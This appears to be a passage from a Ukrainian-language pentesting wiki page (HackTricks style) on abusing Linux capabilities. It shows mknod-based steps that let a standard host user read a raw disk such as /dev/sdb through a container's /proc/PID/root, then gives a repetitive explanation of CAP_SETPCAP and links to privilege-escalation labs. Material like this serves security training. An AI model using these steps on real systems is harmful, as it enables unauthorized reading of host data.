- Визначте свій поточний ID користувача за допомогою `id`, наприклад `uid=1000(standarduser)`.
- Визначте цільовий пристрій, наприклад `/dev/sdb`.

2. **Усередині container від імені `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Знову на хості:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Цей підхід дозволяє стандартному користувачеві отримувати доступ і потенційно читати дані з `/dev/sdb` через container, використовуючи спільні user namespaces і permissions, установлені на пристрої.

### CAP_SETPCAP

**CAP_SETPCAP** дає процесу змогу **змінювати capability sets** іншого процесу, дозволяючи додавати або видаляти capabilities з effective, inheritable і permitted sets. Однак процес може змінювати лише ті capabilities, якими він володіє у власному permitted set, що гарантує неможливість підвищити privileges іншого процесу понад власний рівень. Останні оновлення kernel посилили ці правила, обмеживши `CAP_SETPCAP` лише зменшенням capabilities у власному permitted set або permitted sets його нащадків, щоб зменшити security risks. Для використання потрібно мати `CAP_SETPCAP` в effective set і цільові capabilities у permitted set, використовуючи `capset()` для внесення змін. Це підсумовує основну функцію та обмеження `CAP_SETPCAP`, підкреслюючи його роль в управлінні privileges і підвищенні security.

**`CAP_SETPCAP`** — це Linux capability, яка дозволяє процесу **змінювати capability sets іншого процесу**. Вона надає можливість додавати або видаляти capabilities з effective, inheritable і permitted capability sets інших процесів. Однак існують певні обмеження щодо використання цієї capability.

Процес із `CAP_SETPCAP` **може надавати або видаляти лише ті capabilities, які містяться в його власному permitted capability set**. Іншими словами, процес не може надати іншому процесу capability, якої він сам не має. Це обмеження не дозволяє процесу підвищити privileges іншого процесу понад власний рівень privileges.

Крім того, в останніх версіях kernel capability `CAP_SETPCAP` була **додатково обмежена**. Вона більше не дозволяє процесу довільно змінювати capability sets інших процесів. Натомість вона **дозволяє процесу лише зменшувати capabilities у власному permitted capability set або permitted capability set його нащадків**. Цю зміну було запроваджено для зменшення потенційних security risks, пов’язаних із цією capability.

Для ефективного використання `CAP_SETPCAP` потрібно мати цю capability у своєму effective capability set, а цільові capabilities — у permitted capability set. Після цього можна використовувати системний виклик `capset()` для зміни capability sets інших процесів.

Підсумовуючи, `CAP_SETPCAP` дозволяє процесу змінювати capability sets інших процесів, але він не може надавати capabilities, яких сам не має. Крім того, через security concerns у новіших версіях kernel його функціональність була обмежена: тепер він дозволяє лише зменшувати capabilities у власному permitted capability set або permitted capability sets своїх нащадків.

## References

**Більшість цих прикладів було взято з деяких labs на** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), тому, якщо ви хочете практикувати ці privesc techniques, я рекомендую ці labs.

**Other references**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
